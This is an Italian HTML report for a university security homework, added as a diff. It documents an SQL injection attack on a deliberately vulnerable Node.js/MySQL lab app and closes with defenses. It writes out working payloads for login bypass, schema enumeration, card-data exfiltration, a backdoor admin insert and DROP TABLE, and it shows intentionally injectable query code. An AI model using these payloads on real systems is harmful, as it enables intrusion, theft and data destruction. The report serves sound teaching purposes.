@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<title>Relazione SQL Injection</title>
+<style>
+  @page { size: A4; margin: 22mm 20mm; }
+  * { box-sizing: border-box; }
+  body { font-family: "Segoe UI", Calibri, Arial, sans-serif; font-size: 11pt;
+         line-height: 1.5; color: #1a1a1a; }
+  h1 { font-size: 22pt; margin: 0 0 4pt; }
+  h2 { font-size: 15pt; margin: 22pt 0 6pt; border-bottom: 2px solid #2563eb;
+       padding-bottom: 3pt; color: #1e3a8a; }
+  h3 { font-size: 12.5pt; margin: 14pt 0 4pt; color: #1e40af; }
+  p { margin: 6pt 0; text-align: justify; }
+  code { font-family: Consolas, "Courier New", monospace; background: #eef2ff;
+         padding: 1px 4px; border-radius: 3px; font-size: 9.5pt; }
+  pre { font-family: Consolas, "Courier New", monospace; background: #0f172a;
+        color: #e2e8f0; padding: 10px 12px; border-radius: 6px; font-size: 8.6pt;
+        line-height: 1.35; white-space: pre-wrap; word-break: break-word;
+        page-break-inside: avoid; }
+  pre .c { color: #7dd3fc; }
+  table { border-collapse: collapse; width: 100%; margin: 8pt 0; font-size: 10pt; }
+  th, td { border: 1px solid #cbd5e1; padding: 5px 8px; text-align: left;
+           vertical-align: top; }
+  th { background: #e0e7ff; }
+  .cover { text-align: center; margin-top: 60mm; }
+  .cover .sub { font-size: 13pt; color: #475569; margin-top: 6pt; }
+  .cover .meta { margin-top: 40mm; font-size: 11pt; color: #334155; }
+  .pb { page-break-before: always; }
+  .tag { display: inline-block; font-size: 8.5pt; font-weight: 700; padding: 1px 7px;
+         border-radius: 10px; color: #fff; }
+  .C { background:#0d9488; } .I { background:#b45309; } .A { background:#b91c1c; }
+  ul, ol { margin: 6pt 0; padding-left: 20pt; }
+  li { margin: 2pt 0; }
+  img.fig { display: block; max-width: 100%; margin: 10pt auto 4pt; border: 1px solid #cbd5e1;
+            border-radius: 5px; page-break-inside: avoid; }
+  .cap { font-size: 8.5pt; color: #64748b; text-align: center; margin-top: 0; }
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <h1>Attacchi di SQL Injection in-band</h1>
+  <div class="sub">Violazione delle proprietà CIA di un database<br>tramite un'applicazione web vulnerabile</div>
+  <div class="meta">
+    Relazione tecnica, Homework di Sicurezza Informatica<br>
+    Traccia 2: SQL Injection<br><br>
+    Ambiente: Node.js + Express, MySQL 5.7, Docker Compose
+  </div>
+</div>
+
+<h2 class="pb">1. Obiettivi</h2>
+<p>La traccia chiede di realizzare un attacco di SQL Injection di tipo in-band, basato
+su input dell'utente, usando tautologia, commento di fine riga e/o query piggybacked, e
+di dimostrare la violazione delle tre proprietà CIA partendo dall'ipotesi che
+l'attaccante non conosca la struttura del database. In concreto la traccia elenca quattro
+cose da fare: raccogliere informazioni sulla struttura del DB, esfiltrare dati, modificare
+il contenuto e cancellare una tabella. Questa relazione le affronta tutte, nell'ordine in
+cui le ho effettivamente eseguite.</p>
+<p>La scelta principale è stata di non scrivere nei payload nomi di tabelle o colonne
+noti in partenza: l'attacco parte dal solo form di login e ricostruisce lo schema un
+pezzo alla volta, perché era proprio questo il punto richiesto dalla traccia.</p>
+
+<h2>2. Architettura dell'ambiente di test</h2>
+<h3>2.1 Stack e scelte</h3>
+<p>L'ambiente è tutto dentro Docker Compose, che mi fa girare in due container separati
+il database e l'applicazione web (i due "server" indicati dalla traccia). La traccia
+suggeriva una pagina PHP, ma ho usato Node.js con Express perché lo conosco meglio; il
+difetto che conta resta lo stesso, cioè query costruite incollando stringhe. Il DBMS è
+MySQL 5.7, una versione vecchia, e nel driver ho lasciato acceso
+<code>multipleStatements: true</code>: normalmente è spento, ma serve per far funzionare
+il piggyback, quindi è una vulnerabilità messa lì apposta.</p>
+
+<h3>2.2 Schema del database</h3>
+<p>Il database ha tre tabelle, non una sola: se ci fosse solo <code>users</code> non ci
+sarebbe niente da scoprire e la parte di information gathering non avrebbe senso. La
+tabella <code>users</code> serve al login (id, username, password in chiaro, ruolo);
+<code>carte_credito</code> contiene i dati di pagamento (intestatario, numero, cvv,
+scadenza) ed è il dato sensibile che voglio rubare; <code>ordini</code> è una terza
+tabella che serve solo ad avere qualcosa in più da elencare. All'inizio l'attaccante non
+sa che <code>carte_credito</code> esiste.</p>
+
+<h2>3. Le superfici vulnerabili</h2>
+<p>I punti di iniezione sono due, tutti e due in <code>web/app.js</code>. In nessuno dei
+due l'input viene parametrizzato o controllato: finisce dritto nella stringa SQL.</p>
+<p><strong>POST /login</strong> (autenticazione):</p>
+<pre>const query = `SELECT id, username FROM users
+               WHERE username = '${username}' AND password = '${password}'`;</pre>
+<p><strong>GET /search/result</strong> (ricerca utenti, dopo il login):</p>
+<pre>const query = `SELECT id, username, password FROM users
+               WHERE username = '${user}'`;</pre>
+<p>La pagina di ricerca, quando la query va in errore, stampa direttamente il messaggio
+del DBMS (<code>err.sqlMessage</code>). È un secondo difetto (espone informazioni), e
+come si vede dopo mi ha reso molto più facile la fase di ricognizione.</p>
+<img class="fig" src="screenshots/shot_login.png" alt="pagina di login">
+<p class="cap">Fig. 1: il form di login, l'unica cosa che l'attaccante vede all'inizio.</p>
+
+<h2 class="pb">4. Come ho proceduto</h2>
+<p>Ho seguito il percorso che farebbe uno che parte da zero. Prima entro nell'app saltando
+l'autenticazione (tautologia e commento di fine riga). Poi faccio ricognizione: capisco
+quante colonne ha la query, che versione di DBMS è e con che utente gira, e quali tabelle
+e colonne esistono. A quel punto esfiltro la tabella che ho scoperto, poi passo alla
+scrittura (modifico e inserisco dati) e infine cancello una tabella.</p>
+<p>Tutte le fasi le ho automatizzate in <code>web/attack.js</code>
+(<code>npm run attack</code>), che manda i payload via HTTP e stampa la risposta. Gli
+output qui sotto sono presi da quell'esecuzione; dove utile riporto anche il log del
+server, che mostra la query SQL davvero costruita.</p>
+
+<h2>5. Accesso e ricognizione</h2>
+
+<h3>5.1 Tautologia <span class="tag C">Confidentiality</span></h3>
+<p>Nel campo <code>username</code> metto una condizione sempre vera e commento il resto
+della query, così il controllo sulla password sparisce.</p>
+<p>Payload: <code>' OR '1'='1' -- </code></p>
+<pre><span class="c"># query eseguita (log server)</span>
+SELECT id, username FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'qualsiasi'
+
+<span class="c"># lato attaccante</span>
+HTTP 302 -> redirect /search?justLogged=1
+sessione creata senza credenziali valide</pre>
+
+<h3>5.2 Commento di fine riga <span class="tag C">Confidentiality</span></h3>
+<p>Variante per entrare come un utente preciso (<code>admin</code>) ignorando la
+password. Il <code>-- </code> (con lo spazio dopo, in MySQL serve) taglia via il pezzo
+<code>AND password</code>.</p>
+<p>Payload: <code>admin' -- </code></p>
+<pre>SELECT id, username FROM users WHERE username = 'admin' -- ' AND password = 'password_a_caso'
+HTTP 302 -> redirect /search?justLogged=1   (entrato come admin)</pre>
+
+<h3>5.3 Conteggio delle colonne (ORDER BY)</h3>
+<p>Per usare <code>UNION</code> mi serve sapere quante colonne ha la SELECT. Lo scopro
+aumentando il numero dopo <code>ORDER BY</code> finché il DB non protesta.</p>
+<pre>ORDER BY 5 -> HTTP 500 :: ER_BAD_FIELD_ERROR Unknown column '5' in 'order clause'
+ORDER BY 4 -> HTTP 500 :: ER_BAD_FIELD_ERROR Unknown column '4' in 'order clause'
+ORDER BY 3 -> HTTP 200 :: (nessun errore)
+=> le colonne sono 3</pre>
+<img class="fig" src="screenshots/shot_orderby.png" alt="errore ORDER BY 4">
+
+<h3>5.4 Versione, utente e database</h3>
+<p>Con la UNION a 3 colonne tiro fuori un po' di informazioni di contesto.</p>
+<p>Payload: <code>' UNION SELECT @@version, current_user(), database() -- </code></p>
+<pre>id: 5.7.44 - Name: user@% - Password: testdb</pre>
+<p>Quindi: MySQL 5.7.44, l'app si collega come utente <code>user</code> sul database
+<code>testdb</code>.</p>
+<img class="fig" src="screenshots/shot_version.png" alt="versione e utente DB">
+
+<h3>5.5 Quali tabelle ci sono</h3>
+<p>Chiedo l'elenco a <code>information_schema.tables</code>.</p>
+<p>Payload: <code>' UNION SELECT table_name, table_schema, 1 FROM information_schema.tables WHERE table_schema=database() -- </code></p>
+<pre>carte_credito  | testdb
+ordini         | testdb
+users          | testdb</pre>
+<p>Salta fuori <code>carte_credito</code>: è quella che mi interessa.</p>
+<img class="fig" src="screenshots/shot_tables.png" alt="enumerazione tabelle">
+
+<h3>5.6 Le colonne di carte_credito</h3>
+<p>Payload: <code>' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name='carte_credito' -- </code></p>
+<pre>id (int) | user_id (int) | intestatario (varchar) | numero (varchar) | cvv (varchar) | scadenza (varchar)</pre>
+
+<h2>6. Esfiltrazione dei dati <span class="tag C">Confidentiality</span></h2>
+<p>Adesso che so le colonne, accodo una SELECT su <code>carte_credito</code>.</p>
+<p>Payload: <code>' UNION SELECT numero, cvv, intestatario FROM carte_credito -- </code></p>
+<pre>4539115678901234 | 321 | Mario Bianchi
+5105105105105100 | 852 | Luigi Verdi
+4916338506082832 | 147 | Marco Rossi</pre>
+<p>Numeri di carta e CVV in chiaro tornano dentro la pagina. Riservatezza compromessa.</p>
+<img class="fig" src="screenshots/shot_exfil.png" alt="esfiltrazione carte di credito">
+
+<h2 class="pb">7. Modifica dei dati <span class="tag I">Integrity</span></h2>
+<p>Visto che <code>multipleStatements</code> è acceso, posso attaccare altre query a
+quella del login mettendo un <code>;</code> (query piggybacked).</p>
+
+<h3>7.1 Cambio la password di admin (UPDATE)</h3>
+<p>Payload nel campo username del login: <code>x'; UPDATE users SET password='hacked123' WHERE username='admin'; -- </code></p>
+<pre><span class="c"># query eseguita (due statement)</span>
+SELECT id, username FROM users WHERE username = 'x';
+UPDATE users SET password = 'hacked123' WHERE username = 'admin'; -- ' AND password = 'x'
+
+<span class="c"># controllo cercando admin</span>
+id: 1 - Name: admin - Password: hacked123</pre>
+<img class="fig" src="screenshots/shot_update.png" alt="password admin modificata">
+
+<h3>7.2 Mi creo un utente backdoor (INSERT)</h3>
+<p>Payload: <code>x'; INSERT INTO users (username,password,ruolo) VALUES ('attacker','attackerpass','admin'); -- </code></p>
+<pre>id: 4 - Name: attacker - Password: attackerpass</pre>
+<p>Così ho un account admin con credenziali mie, e rientro quando voglio.</p>
+
+<h2>8. Cancellazione <span class="tag A">Availability</span></h2>
+<p>Sempre con il piggyback, butto giù la tabella delle carte.</p>
+<p>Payload: <code>x'; DROP TABLE carte_credito; -- </code></p>
+<pre><span class="c"># dopo il DROP riprovo a leggerla</span>
+' UNION SELECT numero, cvv, intestatario FROM carte_credito --
+HTTP 500 :: ER_NO_SUCH_TABLE Table 'testdb.carte_credito' doesn't exist</pre>
+<p>La tabella non c'è più: tutto quello che dipende da quei dati smette di funzionare,
+finché non si ripristina da un backup. È una negazione del servizio.</p>
+<img class="fig" src="screenshots/shot_drop.png" alt="tabella distrutta">
+
+<h2>9. Riepilogo CIA</h2>
+<table>
+  <tr><th>Proprietà</th><th>Come</th><th>Risultato</th></tr>
+  <tr><td>Confidentiality</td><td>tautologia, commento, UNION + information_schema</td><td>login bypassato, lette carte di credito e CVV</td></tr>
+  <tr><td>Integrity</td><td>piggyback UPDATE / INSERT</td><td>password di admin cambiata, creato un account backdoor</td></tr>
+  <tr><td>Availability</td><td>piggyback DROP TABLE</td><td>tabella cancellata, servizio fuori uso</td></tr>
+</table>
+<p>Sono violate tutte e tre, e ho usato tutte e tre le modalità della traccia (tautologia,
+commento di fine riga, piggyback), più la UNION per l'esfiltrazione.</p>
+
+<h2>10. Cose notate strada facendo</h2>
+<p>Un paio di cose su cui mi sono bloccato e che spiegano alcune scelte:</p>
+<ul>
+  <li>Il commento <code>--</code> in MySQL vuole uno spazio (o il fine riga) subito dopo
+  i due trattini. Le prime volte non lo mettevo e il payload non funzionava, perché senza
+  lo spazio non lo legge come commento. Per questo li ho scritti tutti con <code>-- </code>.</li>
+  <li>La UNION dà errore se il numero di colonne non combacia: all'inizio tiravo a indovinare
+  e mi usciva <code>The used SELECT statements have a different number of columns</code>.
+  Da lì ho capito che mi serviva prima la fase con <code>ORDER BY</code> per contarle.</li>
+  <li>Il piggyback va solo perché <code>multipleStatements</code> è acceso. L'ho provato
+  anche da spento (default) e lo stesso payload con il <code>;</code> dava errore di sintassi,
+  quindi è proprio quella opzione che apre la porta.</li>
+  <li>L'esfiltrazione l'ho fatta prima del DROP: se cancellavo la tabella per prima, poi
+  i dati non c'erano più da leggere.</li>
+  <li>L'utente <code>user</code> creato da Docker ha tutti i permessi su <code>testdb</code>,
+  anche UPDATE e DROP. È per questo che gli attacchi in scrittura passano, ed è il primo
+  punto dove interviene il minimo privilegio (vedi sotto).</li>
+</ul>
+
+<h2 class="pb">11. Come si difende</h2>
+<p>La difesa principale sono le query parametrizzate (prepared statement): tengono
+separati il codice SQL e i dati, così l'input non può più cambiare la struttura della
+query. Già solo questa ferma tutta la catena vista sopra. In pratica al posto della
+concatenazione si scrive:</p>
+<pre>db.query('SELECT ... WHERE username = ? AND password = ?', [username, password]);</pre>
+<p>Oltre a questa ci sono altre cose da sistemare, ognuna chiude un pezzo:</p>
+<ul>
+  <li><code>multipleStatements: false</code> (è già il default): toglie di mezzo il piggyback.</li>
+  <li>Password salvate con un hash tipo bcrypt: anche se le rubano, non sono in chiaro.</li>
+  <li>Minimo privilegio sull'utente del DB: se l'app deve solo leggere, niente UPDATE/INSERT/DROP.</li>
+  <li>Controllo dell'input (formato, lunghezza): riduce la superficie.</li>
+  <li>Non rimandare al client il messaggio d'errore del DB: senza quei messaggi la fase ORDER BY diventa molto più difficile.</li>
+  <li>Un WAF davanti, che blocca i pattern SQLi più comuni. Da solo non basta, ma aiuta.</li>
+</ul>
+
+<h2>12. Conclusioni</h2>
+<p>Partendo dal solo form di login e senza sapere niente dello schema, sono riuscito a
+entrare senza credenziali, ricostruire le tabelle, leggere i numeri di carta, cambiare i
+dati e infine cancellare una tabella, toccando tutte e tre le proprietà CIA. La causa è
+una sola e banale: le query costruite incollando stringhe. Bastano le query parametrizzate
+per chiudere tutto; le altre misure (minimo privilegio, hash, gestione degli errori) sono
+livelli di sicurezza in più.</p>
+
+</body>
+</html>
